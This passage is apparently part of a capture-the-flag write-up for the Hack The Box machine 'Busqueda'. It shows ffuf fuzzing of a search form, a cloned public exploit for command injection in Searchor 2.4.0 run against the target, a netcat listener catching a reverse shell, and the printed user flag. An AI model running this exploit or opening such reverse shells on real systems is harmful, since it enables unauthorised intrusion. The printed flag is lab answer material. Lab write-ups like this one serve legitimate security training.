.                       [Status: 200, Size: 54, Words: 1, Lines: 1, Duration: 2373ms]
>                       [Status: 200, Size: 56, Words: 1, Lines: 1, Duration: 2406ms]
\                       [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 2440ms]
;                       [Status: 200, Size: 56, Words: 1, Lines: 1, Duration: 2456ms]
=                       [Status: 200, Size: 56, Words: 1, Lines: 1, Duration: 2456ms]
~                       [Status: 200, Size: 54, Words: 1, Lines: 1, Duration: 2472ms]
<                       [Status: 200, Size: 56, Words: 1, Lines: 1, Duration: 2472ms]
(                       [Status: 200, Size: 56, Words: 1, Lines: 1, Duration: 2489ms]
,                       [Status: 200, Size: 56, Words: 1, Lines: 1, Duration: 2473ms]
%                       [Status: 200, Size: 56, Words: 1, Lines: 1, Duration: 2488ms]
^                       [Status: 200, Size: 56, Words: 1, Lines: 1, Duration: 2514ms]
_                       [Status: 200, Size: 54, Words: 1, Lines: 1, Duration: 2499ms]
-                       [Status: 200, Size: 54, Words: 1, Lines: 1, Duration: 2504ms]
[                       [Status: 200, Size: 56, Words: 1, Lines: 1, Duration: 2504ms]
|                       [Status: 200, Size: 56, Words: 1, Lines: 1, Duration: 2513ms]
}                       [Status: 200, Size: 56, Words: 1, Lines: 1, Duration: 2513ms]
)                       [Status: 200, Size: 56, Words: 1, Lines: 1, Duration: 2520ms]
&                       [Status: 200, Size: 53, Words: 1, Lines: 1, Duration: 2513ms]
`                       [Status: 200, Size: 56, Words: 1, Lines: 1, Duration: 2537ms]
:: Progress: [32/32] :: Job [1/1] :: 75 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```

```
ffuf -request req-fuzz.req -request-proto http -w /opt/seclists/Fuzzing/special-chars.txt -ms 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://searcher.htb/search
 :: Wordlist         : FUZZ: /opt/seclists/Fuzzing/special-chars.txt
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Origin: http://searcher.htb
 :: Header           : Referer: http://searcher.htb/
 :: Header           : Host: searcher.htb
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Connection: close
 :: Header           : Upgrade-Insecure-Requests: 1
 :: Data             : engine=UPS&query=iphoneFUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response size: 0
________________________________________________

'                       [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 2818ms]
\                       [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 2908ms]
:: Progress: [32/32] :: Job [1/1] :: 31 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
```

## Searchor exploit

```
git clone https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection.git
```

### Run exploit

```
./exploit.sh searcher.htb 10.10.16.11 9001
```

## Get access to machine : user flag

```
nc -lvnp 9001
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.11.208.
Ncat: Connection from 10.10.11.208:51972.
bash: cannot set terminal process group (1661): Inappropriate ioctl for device
bash: no job control in this shell
svc@busqueda:/var/www/app$ whoami
whoami
svc
svc@busqueda:/var/www/app$ ls /ghome/
ls /ghome/
ls: cannot access '/ghome/': No such file or directory
svc@busqueda:/var/www/app$ ls /home/
ls /home/
svc
svc@busqueda:/var/www/app$ ls /home/svc/
ls /home/svc/
snap
user.txt
svc@busqueda:/var/www/app$ cat /home/svc/user.txt
cat /home/svc/user.txt
1818f3b03ed6db737ff7164f047e2917

```

























